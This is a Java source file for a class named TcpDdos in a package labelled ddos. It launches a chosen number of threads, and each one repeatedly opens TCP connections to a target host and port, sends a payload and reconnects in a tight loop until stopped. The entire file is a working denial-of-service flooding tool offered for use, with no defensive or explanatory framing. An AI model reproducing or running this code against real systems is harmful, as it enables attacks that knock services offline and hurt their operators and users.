package ljs.ddos.tcp;

import ljs.ddos.SocketRequestBuild;
import ljs.io.IOUtil;

import java.io.*;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

public class TcpDdos {
    private int threadNumber;
    private SocketRequestBuild socketRequestBuild;

    public TcpDdos(SocketRequestBuild socketRequestBuild, int threadNumber) {
        this.threadNumber = threadNumber;
        this.socketRequestBuild = socketRequestBuild;
    }

    private int liveThread;
    private boolean stop;

    private class AttachRunnable implements Runnable {
        @Override
        public void run() {
            synchronized (this) {
                liveThread++;
            }
            Socket socket = null;
            while (true) {
                if (stop) break;
                try {
                    socket = new Socket(socketRequestBuild.getHost(), socketRequestBuild.getPort());
                    IOUtil.write(socketRequestBuild.getData(), socket.getOutputStream(), false);
                    StringBuffer stringBuffer = IOUtil.toString(socket.getInputStream(), "UTF-8", false);
                    System.out.println(stringBuffer.toString());
                } catch (IOException e) {
                } finally {
                    IOUtil.close(socket);
                }
            }
            synchronized (this) {
                liveThread--;
            }
        }
    }

    public TcpDdos attack() {
        if (stop) stop = false;
        for (int i = 0; i < threadNumber; i++) new Thread(new AttachRunnable(), "DDos_Thread_" + i).start();
        return this;
    }

    public int getLiveThread() {
        return liveThread;
    }

    public void stop() {
        this.stop = true;
    }
}
